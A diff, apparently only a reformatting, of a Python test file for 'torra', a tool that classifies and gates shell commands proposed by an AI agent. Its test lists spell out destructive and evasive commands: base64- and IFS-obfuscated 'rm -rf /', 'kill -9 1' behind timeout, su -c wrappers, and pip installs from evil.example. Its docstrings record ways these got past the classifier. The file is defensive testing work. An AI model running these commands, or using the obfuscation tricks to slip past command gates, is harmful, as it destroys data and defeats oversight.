@@ -61,7 +61,7 @@ class TestSafety:
         ("apt-get purge --yes ollama", "package purge"),
         ("xargs rm -rf < targets.txt", "xargs indirection"),
         ("$(echo cm0gLXJmIC8=|base64 -d)", "base64 via command substitution"),
-        ("eval \"$(echo cm0gLXJmIC8=|base64 -d)\"", "base64 via eval + substitution"),
+        ('eval "$(echo cm0gLXJmIC8=|base64 -d)"', "base64 via eval + substitution"),
         ("`echo cm0gLXJmIC8=|base64 -d`", "base64 via backtick substitution"),
         ("rm${IFS}-rf${IFS}/srv/data", "IFS-obfuscated rm -rf"),
         ("su -c 'rm -rf /var/lib/x' postgres", "su -c wrapper"),
@@ -74,18 +74,37 @@ class TestSafety:
     ]
 
     ROUTINE = [
-        "ls -la /etc", "cat /proc/meminfo", "df -h", "free -h", "uptime",
-        "systemctl status ollama", "journalctl -u ollama -n 50",
-        "git pull --ff-only", "git log --oneline -20", "git status",
-        "docker ps", "docker logs api --tail 100", "python3 -m pytest tests/",
-        "grep -r TODO src/", "echo hello", "ss -tlnp", "ps aux", "nvidia-smi",
-        "lsblk", "curl -s http://localhost:11434/api/tags",
-        "systemctl status nginx > /dev/null", "grep foo bar.txt 2>/dev/null",
-        "echo \"today is $(date)\"", "tar czf backup-$(date +%Y%m%d).tar.gz /home/user/docs",
-        "VERSION=$(git rev-parse --short HEAD)", "echo \"free: $(df -h / | tail -1)\"",
+        "ls -la /etc",
+        "cat /proc/meminfo",
+        "df -h",
+        "free -h",
+        "uptime",
+        "systemctl status ollama",
+        "journalctl -u ollama -n 50",
+        "git pull --ff-only",
+        "git log --oneline -20",
+        "git status",
+        "docker ps",
+        "docker logs api --tail 100",
+        "python3 -m pytest tests/",
+        "grep -r TODO src/",
+        "echo hello",
+        "ss -tlnp",
+        "ps aux",
+        "nvidia-smi",
+        "lsblk",
+        "curl -s http://localhost:11434/api/tags",
+        "systemctl status nginx > /dev/null",
+        "grep foo bar.txt 2>/dev/null",
+        'echo "today is $(date)"',
+        "tar czf backup-$(date +%Y%m%d).tar.gz /home/user/docs",
+        "VERSION=$(git rev-parse --short HEAD)",
+        'echo "free: $(df -h / | tail -1)"',
         "su - postgres",
-        "ls > /dev/null 2>&1", "echo hi > /dev/null 2> /dev/null",
-        "rsync -a ./src/ ./backup/", "cat /etc/hosts > /dev/null",
+        "ls > /dev/null 2>&1",
+        "echo hi > /dev/null 2> /dev/null",
+        "rsync -a ./src/ ./backup/",
+        "cat /etc/hosts > /dev/null",
     ]
 
     def test_every_evasion_is_caught(self) -> None:
@@ -95,12 +114,14 @@ class TestSafety:
         payload; Perl's bareword unlink, which the old regex's required
         leading dot never matched)."""
         safety = SafetyClassifier()
-        missed = [f"{label}: {cmd!r}" for cmd, label in self.EVASIONS
-                  if not safety.classify(cmd).needs_confirmation]
+        missed = [
+            f"{label}: {cmd!r}"
+            for cmd, label in self.EVASIONS
+            if not safety.classify(cmd).needs_confirmation
+        ]
         assert not missed, missed
 
-    def test_command_substitution_and_ifs_evasions_are_critical_not_just_gated(
-            self) -> None:
+    def test_command_substitution_and_ifs_evasions_are_critical_not_just_gated(self) -> None:
         """`needs_confirmation` alone doesn't distinguish CRITICAL from
         DANGEROUS -- these specific bugs were found live because a real
         `rm -rf /` classified as one severity too low (or not gated at
@@ -109,10 +130,13 @@ class TestSafety:
         would still fail this test even though it would still pass the
         looser needs_confirmation check above."""
         safety = SafetyClassifier()
-        for cmd in ("$(echo cm0gLXJmIC8=|base64 -d)",
-                    "sh -c \"$(echo cm0gLXJmIC8=|base64 -d)\"",
-                    "`echo cm0gLXJmIC8=|base64 -d`",
-                    "rm${IFS}-rf${IFS}/", "rm${IFS}-rf${IFS}/home"):
+        for cmd in (
+            "$(echo cm0gLXJmIC8=|base64 -d)",
+            'sh -c "$(echo cm0gLXJmIC8=|base64 -d)"',
+            "`echo cm0gLXJmIC8=|base64 -d`",
+            "rm${IFS}-rf${IFS}/",
+            "rm${IFS}-rf${IFS}/home",
+        ):
             verdict = safety.classify(cmd)
             assert verdict.level is RiskLevel.CRITICAL, (cmd, verdict.level, verdict.reasons)
 
@@ -125,7 +149,8 @@ class TestSafety:
         payload like this). Recursing into su's -c payload as shell syntax
         means the nested `python3 -c ...` is itself resolved and judged."""
         verdict = SafetyClassifier().classify(
-            "su -c \"python3 -c 'import os; os.system(\\\"rm -rf /var/lib/x\\\")'\" postgres")
+            'su -c "python3 -c \'import os; os.system(\\"rm -rf /var/lib/x\\")\'" postgres'
+        )
         assert verdict.needs_confirmation, verdict.reasons
 
     def test_no_false_positives_on_routine_work(self) -> None:
@@ -142,8 +167,11 @@ class TestSafety:
         that can never lose data. Found via a real torra exploration run
         that hit `systemctl status nginx > /dev/null` and got CRITICAL."""
         safety = SafetyClassifier()
-        for suppressed in ("ls -la > /dev/null", "echo hi 2>/dev/null",
-                           "grep foo bar.txt > /dev/null 2>&1"):
+        for suppressed in (
+            "ls -la > /dev/null",
+            "echo hi 2>/dev/null",
+            "grep foo bar.txt > /dev/null 2>&1",
+        ):
             verdict = safety.classify(suppressed)
             assert verdict.level is RiskLevel.SAFE, (suppressed, verdict.reasons)
 
@@ -169,8 +197,7 @@ class TestSafety:
         assert not any("overwrites" in r for r in appended.reasons)
         assert any("overwrites" in r for r in overwritten.reasons)
 
-    def test_an_interpreter_overwriting_a_file_it_also_read_is_not_silently_safe(
-            self) -> None:
+    def test_an_interpreter_overwriting_a_file_it_also_read_is_not_silently_safe(self) -> None:
         """Found via scripts/dev/model_bench/domain_exploration.py's xlsx-edit
         scenario (2026-08-28, devstral:24b): asked to edit an existing
         spreadsheet, the model proposed one `python3 -c` step that loads
@@ -188,10 +215,11 @@ class TestSafety:
         `SafetyClassifier` has no such rule yet, so this currently fails."""
         safety = SafetyClassifier()
         verdict = safety.classify(
-            "python3 -c \"import openpyxl; "
+            'python3 -c "import openpyxl; '
             "wb = openpyxl.load_workbook('/home/user/Documents/budget.xlsx'); "
             "wb.active.append(['Total', 100]); "
-            "wb.save('/home/user/Documents/budget.xlsx')\"")
+            "wb.save('/home/user/Documents/budget.xlsx')\""
+        )
         assert verdict.needs_confirmation, verdict.reasons
 
     def test_reading_the_same_path_twice_is_not_an_overwrite(self) -> None:
@@ -208,10 +236,11 @@ class TestSafety:
         a name: `open(path, 'r')` vs `open(path, 'w')`."""
         safety = SafetyClassifier()
         verdict = safety.classify(
-            "python3 -c \"import openpyxl; "
+            'python3 -c "import openpyxl; '
             "wb1 = openpyxl.load_workbook('/home/user/Documents/budget.xlsx'); "
             "wb2 = openpyxl.load_workbook('/home/user/Documents/budget.xlsx'); "
-            "print(wb1.active.max_row, wb2.active.max_row)\"")
+            'print(wb1.active.max_row, wb2.active.max_row)"'
+        )
         assert not verdict.needs_confirmation, verdict.reasons
 
     def test_open_builtin_read_then_write_same_path_is_still_caught(self) -> None:
@@ -224,7 +253,8 @@ class TestSafety:
         safety = SafetyClassifier()
         verdict = safety.classify(
             "python3 -c \"data = open('/home/user/Documents/budget.csv', 'r').read(); "
-            "open('/home/user/Documents/budget.csv', 'w').write(data + ',Total,450')\"")
+            "open('/home/user/Documents/budget.csv', 'w').write(data + ',Total,450')\""
+        )
         assert verdict.needs_confirmation, verdict.reasons
 
     def test_open_builtin_read_twice_same_path_is_not_flagged(self) -> None:
@@ -234,7 +264,8 @@ class TestSafety:
         safety = SafetyClassifier()
         verdict = safety.classify(
             "python3 -c \"a = open('/home/user/Documents/budget.csv').read(); "
-            "b = open('/home/user/Documents/budget.csv', 'r').read(); print(a == b)\"")
+            "b = open('/home/user/Documents/budget.csv', 'r').read(); print(a == b)\""
+        )
         assert not verdict.needs_confirmation, verdict.reasons
 
     def test_zip_repack_over_a_relative_document_path_is_still_dangerous(self) -> None:
@@ -273,9 +304,10 @@ class TestSafety:
         realistic xlsx-editing scripts, which lean on comparisons like this
         constantly."""
         verdict = SafetyClassifier().classify(
-            "python3 -c \"import openpyxl; "
+            'python3 -c "import openpyxl; '
             "wb = openpyxl.load_workbook('/home/user/Documents/budget.xlsx'); "
-            "print(wb.active.max_row > 2)\"")
+            'print(wb.active.max_row > 2)"'
+        )
         assert not any("redirect" in r for r in verdict.reasons), verdict.reasons
 
     def test_a_real_redirect_next_to_a_quoted_string_is_still_caught(self) -> None:
@@ -288,6 +320,7 @@ class TestSafety:
     def test_base64_payloads_are_decoded(self) -> None:
         """An obfuscated payload piped to a shell is still what it decodes to."""
         import base64
+
         blob = base64.b64encode(b"rm -rf /var/lib/postgresql").decode()
         verdict = SafetyClassifier().classify(f"echo '{blob}' | base64 -d | sh")
         assert verdict.level is RiskLevel.CRITICAL
@@ -302,6 +335,7 @@ class TestSafety:
         delete to a generic DANGEROUS "piped into a shell" backstop
         finding instead of the real verdict."""
         import base64
+
         blob = base64.b64encode(b"rm -rf /home").decode()
         verdict = SafetyClassifier().classify(f"echo {blob} | base64 -d | sh")
         assert verdict.level is RiskLevel.CRITICAL
@@ -311,8 +345,7 @@ class TestSafety:
         """A naive split on `;` tears `python3 -c "a;b"` apart, and that is
         exactly how a destructive call escapes classification."""
         safety = SafetyClassifier()
-        verdict = safety.classify(
-            "python3 -c \"import shutil;shutil.rmtree('/var/lib/x')\"")
+        verdict = safety.classify("python3 -c \"import shutil;shutil.rmtree('/var/lib/x')\"")
         assert verdict.level in (RiskLevel.DANGEROUS, RiskLevel.CRITICAL)
         assert safety.parse_failures == []
 
@@ -326,12 +359,17 @@ class TestSafety:
         recognized. `kill -s KILL 1`, `kill -SIGKILL 1`, `kill -s 9 1`,
         and plain `kill 1` (default SIGTERM) all classified SAFE."""
         safety = SafetyClassifier()
-        for cmd in ("kill -9 1", "kill -s KILL 1", "kill -SIGKILL 1",
-                   "kill -s 9 1", "kill 1", "kill -9 1 12345"):
+        for cmd in (
+            "kill -9 1",
+            "kill -s KILL 1",
+            "kill -SIGKILL 1",
+            "kill -s 9 1",
+            "kill 1",
+            "kill -9 1 12345",
+        ):
             assert safety.classify(cmd).level is RiskLevel.CRITICAL, cmd
 
-    def test_kill_of_pid_1_is_caught_even_behind_timeouts_value_taking_flag(
-            self) -> None:
+    def test_kill_of_pid_1_is_caught_even_behind_timeouts_value_taking_flag(self) -> None:
         """Found live, the most severe gap this project's own audits have
         caught: `timeout -s KILL 5 kill -9 1` classified SAFE outright.
         `_strip` popped "timeout" as a wrapper, then treated "-s" as a
@@ -345,9 +383,11 @@ class TestSafety:
         an entirely ordinary shell idiom, not a contrived adversarial
         string."""
         safety = SafetyClassifier()
-        for cmd in ("timeout -s KILL 5 kill -9 1",
-                   "timeout --signal=KILL 5 kill -9 1",
-                   "timeout -k 10 5 kill -9 1"):
+        for cmd in (
+            "timeout -s KILL 5 kill -9 1",
+            "timeout --signal=KILL 5 kill -9 1",
+            "timeout -k 10 5 kill -9 1",
+        ):
             assert safety.classify(cmd).level is RiskLevel.CRITICAL, cmd
 
     def test_kill_of_a_different_pid_is_not_mistaken_for_pid_1(self) -> None:
@@ -355,7 +395,9 @@ class TestSafety:
         not a PID -- `kill -s 1 12345` sends SIGHUP to PID 12345 and never
         touches PID 1."""
         verdict = SafetyClassifier().classify("kill -s 1 12345")
-        assert verdict.level is RiskLevel.CAUTION, verdict.reasons  # a bounded write, never CRITICAL
+        assert verdict.level is RiskLevel.CAUTION, (
+            verdict.reasons
+        )  # a bounded write, never CRITICAL
 
     def test_kill_list_mode_is_not_mistaken_for_a_kill(self) -> None:
         """`kill -l [1]` prints a signal name; it kills nothing."""
@@ -381,8 +423,7 @@ class TestSafetyCoverageEdges:
         assert safety.parse_failures
         assert any("parse issue" in r for r in verdict.reasons)
 
-    def test_a_charset_match_that_is_not_valid_base64_is_a_recorded_failure(
-            self) -> None:
+    def test_a_charset_match_that_is_not_valid_base64_is_a_recorded_failure(self) -> None:
         """9 characters from base64's alphabet is not a valid base64 length
         (not a multiple of 4) -- `b64decode(validate=True)` raises, and
         that has to be caught per-candidate, not let one bad match abort
@@ -399,8 +440,7 @@ class TestSafetyCoverageEdges:
         verdict = SafetyClassifier().classify("echo `unterminated")
         assert verdict.level is RiskLevel.SAFE
 
-    def test_max_unwrap_depth_stops_recursion_instead_of_looping_forever(
-            self) -> None:
+    def test_max_unwrap_depth_stops_recursion_instead_of_looping_forever(self) -> None:
         safety = SafetyClassifier(max_depth=-1)
         resolved = safety.resolve("rm -rf /")
         assert resolved == []
@@ -415,14 +455,15 @@ class TestSafetyCoverageEdges:
 
     def test_dd_without_a_block_device_target_is_not_flagged(self) -> None:
         verdict = SafetyClassifier().classify("dd if=/dev/zero of=/tmp/out.img bs=1M count=1")
-        assert verdict.level is RiskLevel.CAUTION, verdict.reasons  # a file write, not a device write
+        assert verdict.level is RiskLevel.CAUTION, (
+            verdict.reasons
+        )  # a file write, not a device write
 
     def test_find_without_delete_or_exec_is_not_flagged(self) -> None:
         verdict = SafetyClassifier().classify('find /tmp -name "*.tmp" -mtime +7')
         assert verdict.level is RiskLevel.SAFE
 
-    def test_a_package_manager_verb_outside_the_known_lists_is_not_flagged(
-            self) -> None:
+    def test_a_package_manager_verb_outside_the_known_lists_is_not_flagged(self) -> None:
         """`list` is neither a removal nor an install/upgrade verb."""
         verdict = SafetyClassifier().classify("apt list --installed")
         assert verdict.level is RiskLevel.SAFE
@@ -438,7 +479,8 @@ class TestSafetyCoverageEdges:
         runs the fetched package's build code, so a non-default source is
         supply-chain / RCE and must be DANGEROUS, not CAUTION."""
         verdict = SafetyClassifier().classify(
-            "pip install --index-url http://198.51.100.23/simple paramo-helper")
+            "pip install --index-url http://198.51.100.23/simple paramo-helper"
+        )
         assert verdict.level is RiskLevel.DANGEROUS, verdict.reasons
         assert verdict.needs_confirmation
         assert any("non-default source" in r for r in verdict.reasons)
@@ -454,39 +496,65 @@ class TestSafetyCoverageEdges:
     def test_a_pip_install_from_a_url_or_vcs_ref_needs_a_tick(self) -> None:
         """A direct URL or a `git+` VCS ref is a non-default source just as a
         custom index is -- both fetch and run code torra cannot vouch for."""
-        for cmd in ("pip install https://evil.example/pkg.whl",
-                    "pip install git+https://github.com/x/y",
-                    "pip install --extra-index-url=https://x pkg",
-                    "pip install --find-links /tmp/wheels pkg"):
+        for cmd in (
+            "pip install https://evil.example/pkg.whl",
+            "pip install git+https://github.com/x/y",
+            "pip install --extra-index-url=https://x pkg",
+            "pip install --find-links /tmp/wheels pkg",
+        ):
             verdict = SafetyClassifier().classify(cmd)
             assert verdict.level is RiskLevel.DANGEROUS, (cmd, verdict.reasons)
 
     def test_a_pip_short_source_option_needs_a_tick_however_it_is_spelled(self) -> None:
         """Re-grade N1 (2026-10-25): `-i`/`-f` were caught only when a URL followed as its own word.
         pip reads the first value-taking letter of a cluster, so these all name an index or links."""
-        for cmd in ("pip install -ihttps://evil.example/simple pkg", "pip install -fhttps://e/l pkg",
-                    "pip install -f ./wheels pkg", "pip install -Uqf ./w pkg",
-                    "pip3 install -qi https://e/s pkg", "pip install -i https://e/s pkg"):
+        for cmd in (
+            "pip install -ihttps://evil.example/simple pkg",
+            "pip install -fhttps://e/l pkg",
+            "pip install -f ./wheels pkg",
+            "pip install -Uqf ./w pkg",
+            "pip3 install -qi https://e/s pkg",
+            "pip install -i https://e/s pkg",
+        ):
             verdict = SafetyClassifier().classify(cmd)
             assert verdict.level is RiskLevel.DANGEROUS, (cmd, verdict.reasons)
-        for cmd in ("pip install -r requirements.txt", "pip install -ri r.txt", "pip install -U requests",
-                    "pip install -qe ."):
+        for cmd in (
+            "pip install -r requirements.txt",
+            "pip install -ri r.txt",
+            "pip install -U requests",
+            "pip install -qe .",
+        ):
             verdict = SafetyClassifier().classify(cmd)  # `-r i`: a requirements file named "i"
             assert verdict.level is RiskLevel.CAUTION, (cmd, verdict.reasons)
 
     def test_a_pip_source_needs_a_tick_when_abbreviated_or_set_in_the_environment(self) -> None:
         """pip's optparse takes any unambiguous prefix (`--find`, `--extra-ind=`) and reads every option
         from `PIP_<NAME>` (or a `PIP_CONFIG_FILE`), so each of these names an index or links too."""
-        for cmd in ("pip install --find ./w pkg", "pip install --extra-ind=./w pkg", "pip install --inde ./w pkg",
-                    "pip3 install --fi=./w pkg", "PIP_INDEX_URL=https://evil.example/simple pip install x",
-                    "PIP_EXTRA_INDEX_URL=./w pip install x", "PIP_FIND_LINKS=./w pip install x",
-                    "env PIP_FIND_LINKS=./w pip install x", "export PIP_INDEX_URL=https://e/s; pip install x",
-                    "PIP_CONFIG_FILE=./p.conf pip install x"):
+        for cmd in (
+            "pip install --find ./w pkg",
+            "pip install --extra-ind=./w pkg",
+            "pip install --inde ./w pkg",
+            "pip3 install --fi=./w pkg",
+            "PIP_INDEX_URL=https://evil.example/simple pip install x",
+            "PIP_EXTRA_INDEX_URL=./w pip install x",
+            "PIP_FIND_LINKS=./w pip install x",
+            "env PIP_FIND_LINKS=./w pip install x",
+            "export PIP_INDEX_URL=https://e/s; pip install x",
+            "PIP_CONFIG_FILE=./p.conf pip install x",
+        ):
             verdict = SafetyClassifier().classify(cmd)
             assert verdict.level is RiskLevel.DANGEROUS, (cmd, verdict.reasons)
-        for cmd in ("pip install requests", "pip install -r requirements.txt", "pip install -e .",
-                    "pip install --upgrade x", "pip install --user x", "pip install --ignore-installed x",
-                    "pip install --force-reinstall x", "pip install --no-index x", "pip install -- x"):
+        for cmd in (
+            "pip install requests",
+            "pip install -r requirements.txt",
+            "pip install -e .",
+            "pip install --upgrade x",
+            "pip install --user x",
+            "pip install --ignore-installed x",
+            "pip install --force-reinstall x",
+            "pip install --no-index x",
+            "pip install -- x",
+        ):
             verdict = SafetyClassifier().classify(cmd)
             assert verdict.level is RiskLevel.CAUTION, (cmd, verdict.reasons)
 
@@ -511,8 +579,7 @@ class TestSafetyCoverageEdges:
         assert verdict.level is RiskLevel.CAUTION
         assert not any("writes to a system path" in r for r in verdict.reasons)
 
-    def test_zip_repacking_over_an_existing_home_directory_file_is_dangerous(
-            self) -> None:
+    def test_zip_repacking_over_an_existing_home_directory_file_is_dangerous(self) -> None:
         """Sibling gap to §2.51: xlsx/odt are both zip containers, and the
         other natural way to edit one -- extract, edit the inner XML, repack
         with `zip` -- was invisible to `_judge` entirely. `zip` had no
@@ -525,7 +592,8 @@ class TestSafetyCoverageEdges:
         domain_exploration.py. Not yet fixed -- `zip` isn't dispatched
         anywhere yet, so this currently fails."""
         verdict = SafetyClassifier().classify(
-            "zip -r /home/user/Documents/contract.odt content.xml -x content.xml")
+            "zip -r /home/user/Documents/contract.odt content.xml -x content.xml"
+        )
         assert verdict.level is RiskLevel.DANGEROUS
         assert any("writes to a system path" in r for r in verdict.reasons)
 
@@ -555,8 +623,7 @@ class TestVerifier:
         """A service up at planning time and dead at step two used to be ignored."""
         state = {"up": True}
         verifier = StateVerifier()
-        verifier.add(Precondition("svc", lambda: state["up"], "must stay up",
-                                  ttl_seconds=0))
+        verifier.add(Precondition("svc", lambda: state["up"], "must stay up", ttl_seconds=0))
 
         assert verifier.run().passed is True
         assert verifier.guard() is None
@@ -590,8 +657,7 @@ class TestVerifier:
     def test_a_raising_probe_counts_as_failed(self) -> None:
         """Swallowing a probe exception would report a false green."""
         verifier = StateVerifier()
-        verifier.add(Precondition(
-            "boom", lambda: (_ for _ in ()).throw(OSError("no /proc")), ""))
+        verifier.add(Precondition("boom", lambda: (_ for _ in ()).throw(OSError("no /proc")), ""))
         report = verifier.run()
         assert report.passed is False
         assert "OSError" in report.results[0].error
@@ -631,8 +697,7 @@ class TestStateVerifierRealProbes:
     def test_tcp_reachable_is_true_for_a_real_listening_port(self) -> None:
         import socket as socket_module
 
-        with socket_module.socket(socket_module.AF_INET,
-                                  socket_module.SOCK_STREAM) as srv:
+        with socket_module.socket(socket_module.AF_INET, socket_module.SOCK_STREAM) as srv:
             srv.bind(("127.0.0.1", 0))
             srv.listen(1)
             port = srv.getsockname()[1]
@@ -641,16 +706,13 @@ class TestStateVerifierRealProbes:
     def test_tcp_reachable_is_false_when_nothing_is_listening(self) -> None:
         import socket as socket_module
 
-        with socket_module.socket(socket_module.AF_INET,
-                                  socket_module.SOCK_STREAM) as probe:
+        with socket_module.socket(socket_module.AF_INET, socket_module.SOCK_STREAM) as probe:
             probe.bind(("127.0.0.1", 0))
             free_port = probe.getsockname()[1]
         # probe closed above, freeing the port -- nothing listens on it now
-        assert StateVerifier.tcp_reachable(
-            "127.0.0.1", free_port, timeout=0.5) is False
+        assert StateVerifier.tcp_reachable("127.0.0.1", free_port, timeout=0.5) is False
 
-    def test_service_active_returns_false_on_a_probe_exception(
-            self, monkeypatch) -> None:
+    def test_service_active_returns_false_on_a_probe_exception(self, monkeypatch) -> None:
         def broken_run(cmd, **kwargs):
             raise OSError("systemctl not found")
 
@@ -671,6 +733,7 @@ class TestSystemctlScope:
         def fake_run(cmd, **kwargs):
             class Result:
                 stdout = "LoadState=loaded\n"
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
@@ -679,9 +742,11 @@ class TestSystemctlScope:
     def test_a_system_only_unit_falls_back_to_system_scope(self, monkeypatch) -> None:
         """--user reports "not-found" for a unit it doesn't know about --
         exactly ollama.service's situation on the reference machine."""
+
         def fake_run(cmd, **kwargs):
             class Result:
                 stdout = "LoadState=not-found\n"
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
@@ -702,9 +767,16 @@ class TestSystemctlScope:
 
         def fake_run(cmd, **kwargs):
             calls.append(cmd)
+
             class Result:
-                stdout = ("LoadState=not-found\n" if "show" in cmd
-                          else "active\n" if "--user" not in cmd else "inactive\n")
+                stdout = (
+                    "LoadState=not-found\n"
+                    if "show" in cmd
+                    else "active\n"
+                    if "--user" not in cmd
+                    else "inactive\n"
+                )
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
@@ -718,8 +790,10 @@ class TestSystemctlScope:
 
         def fake_run(cmd, **kwargs):
             calls.append(cmd)
+
             class Result:
                 stdout = "active\n"
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
@@ -763,7 +837,8 @@ class TestUndoGeneration:
     def test_a_created_file_is_deleted_not_restored(self, tmp_path: Path) -> None:
         target = tmp_path / "new.conf"
         action = UndoGenerator(shadow_dir=tmp_path / "s").for_step(
-            Step("create", touches=[str(target)]))[0]
+            Step("create", touches=[str(target)])
+        )[0]
         assert action.snapshot is not None
         assert action.snapshot.kind is SnapshotKind.FILE_ABSENT
 
@@ -771,12 +846,12 @@ class TestUndoGeneration:
         action.undo()
         assert not target.exists()
 
-    def test_mkdir_undo_refuses_to_delete_a_filled_directory(self,
-                                                             tmp_path: Path) -> None:
+    def test_mkdir_undo_refuses_to_delete_a_filled_directory(self, tmp_path: Path) -> None:
         """Deleting a directory someone filled is a second disaster."""
         target = tmp_path / "newdir"
         action = UndoGenerator(shadow_dir=tmp_path / "s").for_step(
-            Step("make", command=f"mkdir -p {target}"))[0]
+            Step("make", command=f"mkdir -p {target}")
+        )[0]
 
         target.mkdir()
         (target / "someone_elses.txt").write_text("important", encoding="utf-8")
@@ -788,7 +863,8 @@ class TestUndoGeneration:
         assert not target.exists()
 
     def test_mkdir_undo_verify_is_false_when_the_directory_is_left_behind(
-            self, tmp_path: Path) -> None:
+        self, tmp_path: Path
+    ) -> None:
         """Found live: verify() read `not target.exists() or
         any(target.iterdir())` -- when undo() correctly declines to rmdir a
         directory someone filled, "still exists AND has content" made
@@ -797,20 +873,23 @@ class TestUndoGeneration:
         must mean the prior state -- absent -- was actually confirmed."""
         target = tmp_path / "newdir"
         action = UndoGenerator(shadow_dir=tmp_path / "s").for_step(
-            Step("make", command=f"mkdir -p {target}"))[0]
+            Step("make", command=f"mkdir -p {target}")
+        )[0]
 
         target.mkdir()
         (target / "someone_elses.txt").write_text("important", encoding="utf-8")
         action.undo()
-        assert _verify(action) is False, \
+        assert _verify(action) is False, (
             "a directory left behind with real content must not verify as undone"
+        )
 
         (target / "someone_elses.txt").unlink()
         action.undo()
         assert _verify(action) is True
 
     def test_service_undo_uses_the_same_scope_it_was_captured_under(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         """Found in a full-file audit: capture_service's generated undo
         hardcoded --user regardless of the unit's actual scope. A system
         unit's undo would run against the wrong systemd instance --
@@ -825,15 +904,19 @@ class TestUndoGeneration:
 
         def fake_run(cmd, **kwargs):
             calls.append(cmd)
+
             class Result:
                 returncode = 0
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
-        generator = UndoGenerator(shadow_dir=tmp_path / "s",
-                                  service_probe=fake_service_probe,
-                                  enabled_probe=lambda unit: "enabled",
-                                  scope_probe=fake_scope_probe)
+        generator = UndoGenerator(
+            shadow_dir=tmp_path / "s",
+            service_probe=fake_service_probe,
+            enabled_probe=lambda unit: "enabled",
+            scope_probe=fake_scope_probe,
+        )
         action = generator.capture_service("myservice")
         action.undo()
 
@@ -844,9 +927,12 @@ class TestUndoGeneration:
     def test_the_units_a_systemctl_step_acts_on_come_from_its_arguments(self) -> None:
         """`enable --now nginx` used to yield the unit `--now`."""
         from torra.gates.service_state import service_units
+
         assert service_units("sudo systemctl enable --now nginx") == ["nginx"]
         assert service_units("systemctl --user restart a.service b@1.service") == [
-            "a.service", "b@1.service"]
+            "a.service",
+            "b@1.service",
+        ]
         assert service_units("systemctl status nginx") == []
         assert service_units("systemctl stop x && systemctl disable y") == ["x", "y"]
 
@@ -857,23 +943,31 @@ class TestUndoGeneration:
         def fake_run(cmd, **kwargs):
             calls.append(cmd)
             verb = cmd[1 if "--user" not in cmd else 2]
-            state["enabled"] = {"enable": "enabled", "disable": "disabled", "mask": "masked",
-                                "unmask": "disabled"}.get(verb, state["enabled"])
+            state["enabled"] = {
+                "enable": "enabled",
+                "disable": "disabled",
+                "mask": "masked",
+                "unmask": "disabled",
+            }.get(verb, state["enabled"])
             state["active"] = {"start": "active", "stop": "inactive"}.get(verb, state["active"])
 
             class Result:
                 returncode = 0
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
-        generator = UndoGenerator(shadow_dir=tmp_path / "s",
-                                  service_probe=lambda unit: state["active"],
-                                  enabled_probe=lambda unit: state["enabled"],
-                                  scope_probe=lambda unit: "system")
+        generator = UndoGenerator(
+            shadow_dir=tmp_path / "s",
+            service_probe=lambda unit: state["active"],
+            enabled_probe=lambda unit: state["enabled"],
+            scope_probe=lambda unit: "system",
+        )
         return generator, state, calls
 
     def test_undoing_a_disable_re_enables_the_unit_and_verifies_both_facts(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         generator, state, calls = self._unit(tmp_path, monkeypatch, "active", "enabled")
         action = generator.capture_service("nginx")
         state.update(active="inactive", enabled="disabled")  # the step: disable --now
@@ -885,7 +979,8 @@ class TestUndoGeneration:
         assert action.verify is not None and action.verify() is True
 
     def test_an_undo_that_restores_only_the_running_state_is_not_called_verified(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         generator, state, _ = self._unit(tmp_path, monkeypatch, "active", "enabled")
         action = generator.capture_service("nginx")
         state.update(active="active", enabled="disabled")  # running again, still disabled
@@ -904,8 +999,9 @@ class TestUndoGeneration:
     def test_package_undo_is_unsafe_by_design(self, tmp_path: Path) -> None:
         """Removing packages cascades through dependencies, so it asks first."""
         installed = {"curl", "git"}
-        generator = UndoGenerator(shadow_dir=tmp_path / "shadow",
-                                  package_probe=lambda: set(installed))
+        generator = UndoGenerator(
+            shadow_dir=tmp_path / "shadow", package_probe=lambda: set(installed)
+        )
         action = generator.for_step(Step("i", command="sudo apt install -y nginx"))[0]
         assert action.safe is False
         installed.add("nginx")
@@ -917,8 +1013,7 @@ class TestUndoGeneration:
         regardless -- a working-looking UndoAction that would fail (or
         remove the wrong packages) the moment it actually ran. Naming the
         step uncovered is honest; a broken undo that looks safe is not."""
-        generator = UndoGenerator(shadow_dir=tmp_path / "shadow",
-                                  package_probe=lambda: {"curl"})
+        generator = UndoGenerator(shadow_dir=tmp_path / "shadow", package_probe=lambda: {"curl"})
         actions = generator.for_step(Step("i", command="sudo dnf install -y nginx"))
         assert actions == []
 
@@ -940,8 +1035,7 @@ class TestUndoGeneration:
         assert coverage["coverage_ratio"] == 0.0
         assert coverage["uncovered"] == ["dd", "mkfs", "migrate"]
 
-    def test_dd_against_a_regular_declared_file_is_already_covered(
-            self, tmp_path: Path) -> None:
+    def test_dd_against_a_regular_declared_file_is_already_covered(self, tmp_path: Path) -> None:
         """HANDOFF.md §6.3: dd/mkfs writing to a regular file, not a raw
         device, need nothing special -- `touches` is the only thing that
         was ever required, the exact same mechanism `cp`/`sed -i`/any other
@@ -950,8 +1044,9 @@ class TestUndoGeneration:
         target = tmp_path / "disk.img"
         target.write_bytes(b"ORIGINAL" * 100)
         generator = UndoGenerator(shadow_dir=tmp_path / "shadow")
-        step = Step("wipe", command=f"dd if=/dev/zero of={target} bs=800 count=1",
-                   touches=[str(target)])
+        step = Step(
+            "wipe", command=f"dd if=/dev/zero of={target} bs=800 count=1", touches=[str(target)]
+        )
 
         actions = generator.for_step(step)
         assert len(actions) == 1
@@ -973,8 +1068,7 @@ class TestUndoGeneration:
         assert generator.for_step(Step("b", touches=[str(big)])) == []
         assert any("over max_shadow_bytes" in s for s in generator.skipped)
 
-    def test_cleanup_empties_the_shadow_dir_but_keeps_it_usable(
-            self, tmp_path: Path) -> None:
+    def test_cleanup_empties_the_shadow_dir_but_keeps_it_usable(self, tmp_path: Path) -> None:
         """Found in a full-file audit: cleanup() had zero callers anywhere,
         so shadow directories accumulated forever (14 found on one real
         machine). Wiring it up has to leave the generator usable for the
@@ -994,8 +1088,7 @@ class TestUndoGeneration:
